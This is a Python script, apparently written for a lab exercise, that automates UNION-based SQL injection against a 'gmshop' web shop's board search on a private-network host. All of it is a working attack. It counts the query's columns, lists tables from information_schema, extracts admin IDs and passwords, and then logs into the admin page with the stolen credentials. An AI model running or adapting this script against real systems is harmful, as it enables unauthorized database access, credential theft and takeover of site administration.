from bs4 import BeautifulSoup
import requests
import re

URL = 'http://192.168.200.129/gmshop/board_list.php'
cookies = {"PHPSESSID":"a796195aea1c9f9af451d66b66f75038"}



# 사진 컨테스트 컬럼 정보 파싱
def get_use_column(response):
    html = response.text
    soup = BeautifulSoup(html, 'html.parser')
    # data = soup.find('div',align='center')
    _font = soup.select('td>div>font')
    data=''
    for font in _font:
        data+=font.text+' '
    
    return data[-4:]

# 에러 정보 파싱
def get_html(response):
    html = response.text
    soup = BeautifulSoup(html, 'html.parser')
    my_table = soup.select('td')
    data=''
    for table in my_table:
        data+=table.text
    return data

# post_data = {'boardIndex':'4',
# 'search':'name', 
# 'searchstring':'\' order by 26#'}

# res = requests.post(URL, data = post_data, cookies=cookies)
# data = get_html(res)
# print(data)



# 컬럼 수 
def column_num():
    for i in range(1,30):
        post_data = {'boardIndex':'4',
        'search':'name', 
        'searchstring':'\' order by %d#'%i}

        res = requests.post(URL, data = post_data, cookies=cookies)
        data = get_html(res)
        

        check_warning = re.findall("mysql_fetch_array()", data)
        print('[+] 컬럼 수 쿼리 '+post_data.get("searchstring"))

        if check_warning:
            # print('[+] 컬럼 수 쿼리 '+post_data.get("searchstring"))
            return i # table numberic

# 사용 컬럼 개수 위치 파악 쿼리 제작
def column_read_query(num):
    read_query = "union select "
    for i in range(1,num):
        read_query += str(i)+','    
    
    read_query = '0\'' + read_query.rstrip(",") + '#'
    return read_query

# 사용 컬럼 파악
def column_read(query):
    post_data = {'boardIndex':'4',
        'search':'name', 
        'searchstring':'%s'%query}
    print('[+] 사용 컬럼 파악 쿼리 '+post_data.get("searchstring"))
    res = requests.post(URL, data = post_data, cookies=cookies)    
    data = get_html(res)   
    
    check_warning = re.findall("mktime()", data)

    if check_warning:
        data = get_use_column(res)
        print("[+] 사용 컬럼 : "+data)

# 테이블 이름 쿼리 제작
def get_table_name_query(num):
    table_name_query = "union select "
    for i in range(1,num):        
        if (i == 3):
                table_name_query += 'table_name'+','
        else:    
            table_name_query += str(i)+','    
    table_name_query = '0\'' + table_name_query.rstrip(",") + ' from information_schema.tables#'    
    return table_name_query        

# 테이블 이름 리스트
def get_table_name_list(response):
    html = response.text
    soup = BeautifulSoup(html, 'html.parser')    
    _name = soup.find_all('font', color="009BD4")
    name_list = []
    for name in _name:
        # print(name.text)
        name_list.append(name.text)
    return name_list
    

# 테이블 이름 가져오기
def get_table_name(query):
    post_data = {'boardIndex':'4',
        'search':'name', 
        'searchstring':'%s'%query}
    print('[+] 테이블 이름 가져오기 쿼리 '+post_data.get('searchstring'))
    res = requests.post(URL, data = post_data, cookies=cookies)        
    table_name_list = get_table_name_list(res)

    target_table = ['admin', 'administrator', 'member', 'user']
    exploit_table_list = []
    for tnl in table_name_list:
        for tt in target_table:
            if (tt==tnl):
                print("[+] 대상 테이블 이름 : %s"%tt)
                exploit_table_list.append(tt)
                break
    return exploit_table_list


# 컬럼 정보 가져오기 쿼리 제작
def get_column_info_query(num, exploitTableName):
    get_column_info_query = "union select "
    for i in range(1,num):        
        if (i == 3):
                get_column_info_query += 'column_name'+','
        else:    
            get_column_info_query += str(i)+','    
    get_column_info_query = '0\'' + get_column_info_query.rstrip(",") + ' from information_schema.columns where table_name=\''+exploitTableName+'\'#'   
    return get_column_info_query

# 컬럼 정보 필터링
def get_column_info_filter(response):
    html = response.text
    soup = BeautifulSoup(html, 'html.parser')
    # data = soup.find('div',align='center')
    _column_info = soup.find_all('font', color="009BD4")
    info_list = []
    for info in _column_info:
        # print(info.text)
        info_list.append(info.text)
        print(info_list)
    return info_list


# 컬럼 정보 가져오기
def get_column_info(query):
    post_data = {'boardIndex':'4',
        'search':'name', 
        'searchstring':'%s'%query}
    print('[+] 컬럼 정보 가져오기 쿼리 '+post_data.get('searchstring'))
    res = requests.post(URL, data = post_data, cookies=cookies)
    column_info = get_column_info_filter(res)
    cnt = 0
    column_info_idx = []
    for ci in column_info:
        if (re.findall('admin', ci)):
            column_info_idx.append(ci)
            print('[%d] admin 컬럼 %s'%(cnt, column_info_idx[cnt]))            
            cnt += 1            
    
    return column_info_idx  



# admin 테이블 컬럼 확인 쿼리 제작
def get_admin_table_query(num, adminColumn, exploitTableName):
    admin_table_query = "union select "
    for i in range(1,num):        
        if (i == 3):
            admin_table_query += str(adminColumn[0])+','
        elif (i == 8):
            admin_table_query += str(adminColumn[1])+','
        else:    
            admin_table_query += str(i)+','    

    admin_table_query = '0\'' + admin_table_query.rstrip(",")+' from '+exploitTableName+'#'
    # print (admin_table_query)
    return admin_table_query

    
# admin 테이블 컬럼 필터링
def get_admin_table_filter(response):
    html = response.text
    soup = BeautifulSoup(html, 'html.parser')
    # data = soup.find('div',align='center')
    _id = soup.find_all('font', color="009BD4")
    _pwd = soup.find_all('font', attrs={"class":"stext"})
    account = {}
    for id in _id:
        account = {'adminId':id.text}
    account['adminPwd']=_pwd[8].text
    return account
    

# admin 테이블 컬럼 확인 (adminId, adminPwd, adminEmail, adminEmail2)
def get_admin_table(query):
    post_data = {'boardIndex':'4',
        'search':'name', 
        'searchstring':'%s'%query}
    print('[+] admin 테이블 컬럼 확인 쿼리 '+post_data.get('searchstring'))
    res = requests.post(URL, data = post_data, cookies=cookies)
    admin_account = get_admin_table_filter(res)
    print(admin_account)
    return admin_account


# admin page 접속
def admin_login(account):
    print('[+] admin page 접속')
    ADMINURL='http://192.168.200.129/gmshop/admin/'
    res = requests.post(ADMINURL, data=account, cookies=cookies)    
    if res.status_code == 200:
        print('[+] admin page 접속 완료')  



colNum = column_num()

rQuery = column_read_query(colNum)
column_read(rQuery)

tQuery = get_table_name_query(colNum)
exploit_table_list = get_table_name(tQuery)

cQuery = get_column_info_query(colNum, exploit_table_list[0])
adminColumn = get_column_info(cQuery)
# print(adminColumn)

adminQuery = get_admin_table_query(colNum, adminColumn, exploit_table_list[0])
admin_account = get_admin_table(adminQuery)

admin_login(admin_account)


